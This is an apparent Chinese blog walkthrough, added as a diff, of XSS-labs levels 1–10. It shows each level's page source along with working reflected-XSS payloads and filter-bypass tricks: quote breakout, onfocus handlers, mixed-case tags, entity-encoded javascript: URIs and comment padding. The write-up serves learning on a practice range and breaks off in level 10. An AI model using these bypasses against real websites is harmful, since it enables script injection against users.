@@ -1,0 +1,954 @@
+<hr>
+<h2 id="title-XSS-labs通关教程date-2024-05-20categories-Web安全-XSStags-XSS-labs-实战"><a href="#title-XSS-labs通关教程date-2024-05-20categories-Web安全-XSStags-XSS-labs-实战" class="headerlink" title="title: XSS-labs通关教程date: 2024-05-20categories:  - Web安全  - XSStags:  - XSS  - labs  - 实战"></a>title: XSS-labs通关教程<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - XSS<br>tags:<br>  - XSS<br>  - labs<br>  - 实战</h2><h1 id="XSS-labs通关"><a href="#XSS-labs通关" class="headerlink" title="XSS-labs通关"></a>XSS-labs通关</h1><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><blockquote>
+<p>查看源码，可以发现<strong>get传参name的值test插入了html里头</strong>，还回显了payload的长度</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level2.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level1&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
+&lt;h2 align=center&gt;欢迎用户1&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:1&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>直接上payload，插入一段js代码，get传参</p>
+<p>​<code>url?name=&lt;script&gt;alert()&lt;/script&gt;</code>​</p>
+<p><strong>源码</strong></p>
+<p><img src="/assets/a82b1fd842e885d5bd9c5df71535c4a8-20250425090536-v8euh4y.png" alt="a82b1fd842e885d5bd9c5df71535c4a8"></p>
+<p>没有啥过滤的，很普通，单纯插入即可</p>
+<p> <strong>本关小结</strong>： JS弹窗函数alert()</p>
+<hr>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level3.php?writing=wait&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level2&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和test相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;test&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>第一个test可以跟上次一样直接插入js即可，我们先试试看</p>
+<blockquote>
+<p>​<code>&lt;script&gt;alert()&lt;/script&gt;</code>​</p>
+</blockquote>
+<p>没成功，看一下**&#x3D;&#x3D;源码&#x3D;&#x3D;**</p>
+<p><img src="/assets/85e1177ccdebfce885cdb217993301c0-20250425090626-8qa4h50.png" alt="85e1177ccdebfce885cdb217993301c0"></p>
+<p>第一个test进行了html实体转义，但是第二个没有，我们只需要闭合掉双引号即可，构造payload</p>
+<p>​<code>&quot;&gt;  &lt;script&gt;alert()&lt;/script&gt;  &lt;&quot;</code>​</p>
+<p>再看一下&#x3D;&#x3D;源码&#x3D;&#x3D;</p>
+<p><img src="/assets/326771e8135a50d08c8ce3cd9241b048-20250425090714-czc37lt.png" alt="326771e8135a50d08c8ce3cd9241b048"></p>
+<p>果然进行了html实体转化</p>
+<p> <strong>本关小结</strong>：闭合绕过</p>
+<hr>
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>我们先输入123456来查看一下源码</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level3&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和123456相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value=&#39;123456&#39;&gt;	
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:6&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>相对于上一关，这里是单引号闭合，试一下看看</p>
+<blockquote>
+<p>​<code>&#39;&gt; &lt;script&gt;alert()&lt;/script&gt; &lt;&#39;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level3&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&#39;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; &amp;lt;&#39;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value=&#39;&#39;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; &amp;lt;&#39;&#39;&gt;	
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:30&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>没想到符号也被实体化了，我们看一下源码</p>
+<p><img src="/assets/708aed34e8abff5bf1958a5568edd2c4-20250425091306-lnvekb8.png" alt="708aed34e8abff5bf1958a5568edd2c4"></p>
+<p>果然被实体化了，但是htmlspecialchars函数只针对&lt;&gt;大于小于号进行html实体化，我们还可以利用其他方法进行xss注入，这里我们可以利用<strong>onfocus事件绕过</strong></p>
+<blockquote>
+<p>所以我们可以利用这个事件来绕过&lt;&gt;号的过滤已达到执行js的目的，构造&#x3D;&#x3D;payload&#x3D;&#x3D;</p>
+<p>​<code>&#39; onfocus=javascript:alert() &#39;</code>​</p>
+</blockquote>
+<p><img src="/assets/09e73e59e14d25787995c6673e83e46a-20250425091557-v3d1sb9.png" alt="09e73e59e14d25787995c6673e83e46a"></p>
+<p>然后再点击输入框触发onfocus事件即可</p>
+<p><img src="/assets/e28f81b6f82595fe857a54a45ba3f647-20250425091605-01k82o1.png" alt="e28f81b6f82595fe857a54a45ba3f647"></p>
+<p><strong>本关小结</strong> ：onfocus可以绕过html实体化（即&lt;&gt;号的过滤）</p>
+<hr>
+<h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>查看一下网站源码</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level4&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和try harder!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;try harder!&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:11&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这里是双引号闭合，&lt;input&gt;标签，所以我们还能继续利用onfocus事件，构建payload</p>
+<blockquote>
+<p>​<code>&quot; onfocus=javascript:alert() &quot;</code>​</p>
+</blockquote>
+<p><img src="/assets/image-20250425091946-nyeouet.png" alt="image"></p>
+<p>看一下这关的源码</p>
+<p><img src="/assets/f23de092ba6e0a07cfdc613516dcfb7c-20250425092013-apm0zn4.png" alt="f23de092ba6e0a07cfdc613516dcfb7c"></p>
+<p>这里只是把&lt;&gt;号给删掉了，没多做过滤</p>
+<p> <strong>本关小结</strong>：无</p>
+<hr>
+<h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level6.php?keyword=break it out!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level5&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和find a way out!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;find a way out!&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:15&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这关感觉常规的方法过不去，我们先试试看</p>
+<blockquote>
+<p>​<code>&quot; onfocus=javascript:alert() &quot;</code>​</p>
+</blockquote>
+<p>不成功看回显</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level6.php?keyword=break it out!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level5&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; onfocus=javascript:alert() &amp;quot;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; o_nfocus=javascript:alert() &quot;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:31&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>果然，这里on被替换成了o_n，先看一下这关的源码<br>​<img src="/assets/fb3c126f3dd9291adf4d4877b09afea2-20250425092229-7hxybq6.png" alt="fb3c126f3dd9291adf4d4877b09afea2"></p>
+<p>&#x3D;&#x3D;过滤了js的标签还有onfocus事件&#x3D;&#x3D;，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入，这里我们用<strong>a href标签法</strong>，</p>
+<blockquote>
+<p><img src="/assets/3d76230687597cd12652b56bb2abc570-20250425092322-35rjh6k.png" alt="3d76230687597cd12652b56bb2abc570"></p>
+<p><strong>href属性</strong>的意思是 当标签 <strong>&lt;a&gt;</strong> 被点击的时候，就会<strong>触发执行转跳</strong>，上面是转跳到一个网站，我们还可以触发执行一段js代码</p>
+</blockquote>
+<p>添加一个标签得闭合前面的标签，构建payload</p>
+<blockquote>
+<p>​<code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code>​</p>
+</blockquote>
+<p>后面点击链接跳转即可通关</p>
+<p><strong>本关小结</strong>：可以插入标签（如&lt;a&gt;标签的href属性）达到js执行的效果，前提是闭合号&lt;“”&gt;没失效</p>
+<hr>
+<h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level7.php?keyword=move up!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level6&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和break it out!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;break it out!&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:13&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这感觉很悬，不知道过滤了啥，输入关键字测试看看</p>
+<blockquote>
+<p>​<code>onfocus &lt;script&gt; &lt;a href=javascript:alert()&gt;</code>​</p>
+</blockquote>
+<p>来查看一下过滤</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level7.php?keyword=move up!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level6&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和onfocus &amp;lt;script&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascript:alert()&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:47&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>过滤了好多，看看大小写能不能绕过</p>
+<blockquote>
+<p>​<code>OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level7.php?keyword=move up!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level6&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和onfocus &amp;lt;script&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascript:alert()&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:47&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>发现大小写没有被过滤掉，这题能利用大小写进行绕过，所以我们可以用下面的方法，构造payload</p>
+<blockquote>
+<p>​<code>&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</code>​</p>
+<p>​<code>&quot; Onfocus=javascript:alert() &quot;</code>​</p>
+<p>​<code>&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;</code>​</p>
+</blockquote>
+<p>完事查看一下这关的源码</p>
+<p><img src="/assets/27f57d04b99b48c93ac4afdc07754bdb-20250425093223-69ci25u.png" alt="27f57d04b99b48c93ac4afdc07754bdb"></p>
+<p>这关甚至还过滤掉了data，但是没有添加小写转化函数 ，导致能用大写绕过</p>
+<p> <strong>本关小结</strong>：大小写法绕过str_replace()函数</p>
+<hr>
+<h1 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h1><p>老规矩了，先上关键字试试看</p>
+<blockquote>
+<p>​<code>&quot; OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level8.php?keyword=nice try!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level7&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; onfocus &amp;lt;script&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; focus &lt;&gt; &lt;a =java:alert()&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:28&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<blockquote>
+<p>发现传的值变成<code>&quot; focus &lt;&gt; &lt;a =java:alert()&gt;&quot;</code>​</p>
+</blockquote>
+<p>不难发现，这里面进行了小写转化，将检测出来的on，script，href给删掉了，但是没有关系，我们可以利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p>
+<blockquote>
+<p>​<code>javascript:alert()</code>​</p>
+</blockquote>
+<p>利用在线工具进行Unicode编码后得到，<a href="https://www.matools.com/code-convert-unicode" title="在线Unicode编码解码">在线Unicode编码解码</a></p>
+<blockquote>
+<p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</code>​</p>
+</blockquote>
+<p><strong>本关小结</strong>： href属性自动解析Unicode编码</p>
+<hr>
+<h1 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h1><p>老套路，先输入一个123试试呢</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level9.php?keyword=not bad!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level8&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;123&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;123&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>输入的值插入了两个地方，第一个是input标签，第二个是href属性，老方法，先看看过滤了啥关键字</p>
+<blockquote>
+<p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level9.php?keyword=not bad!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level8&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&amp;quot; src data onfocus &amp;lt;script&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&amp;quot sr_c da_ta o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascr_ipt:alert()&gt;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:65&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>可以发现，input标签添加了html实体转化函数还把双引号也给实体化了， 添加了小写转化函数，还有过滤掉了src、data、onfocus、href、script、”（双引号），难搞哦，看一下这关的源码</p>
+<p><img src="/assets/99dede9426bbb01b41cfd33ffcd9db8d-20250425095703-192nk6o.png" alt="99dede9426bbb01b41cfd33ffcd9db8d"></p>
+<p>果然，但是我们能利用href的隐藏属性自动Unicode解码，我们可以插入一段js伪协议</p>
+<blockquote>
+<p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</code>​</p>
+<p>javascript:alert()&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p>
+</blockquote>
+<p><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</p>
+<hr>
+<h1 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h1><p>老套路，看看过滤了啥子</p>
+<blockquote>
+<p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level10.php?keyword=well done!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level9&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&amp;quot; src data onfocus &amp;lt;script&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt; &amp;amp;#106;&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:72&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>里呢，当false等于false的时候(就是传入的值没有http:&#x2F;&#x2F;)就会执行if，为了防止false===false，我们需要向传入的值里面添加http:&#x2F;&#x2F;并用注释符注释掉否则会执行不了无法弹窗，让函数strpos返回一个数字，构造payload</p>
+<blockquote>
+<p>​<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</code>​</p>
+<p>javascript:alert()&#x2F;* http:&#x2F;&#x2F; *&#x2F;</p>
+</blockquote>
+<p><strong>本关小结</strong>：插入指定内容（本关是http:&#x2F;&#x2F;）绕过检测，再将指定内容用注释符注释掉即可</p>
+<hr>
+<h1 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h1><pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level11.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level10&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和well done!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:10&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这里可以看到，Get传参的值，只插入了h2标签里头，额那下面的input标签啥东西，还隐藏掉了</p>
+<p>不管那么多，老规矩，先测试一下关键字</p>
+<blockquote>
+<p>​<code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code>​</p>
+</blockquote>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level11.php?keyword=good job!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level10&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; sRc DaTa OnFocus &amp;lt;sCriPt&amp;gt; &amp;lt;a hReF=javascript:alert()&amp;gt; 相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
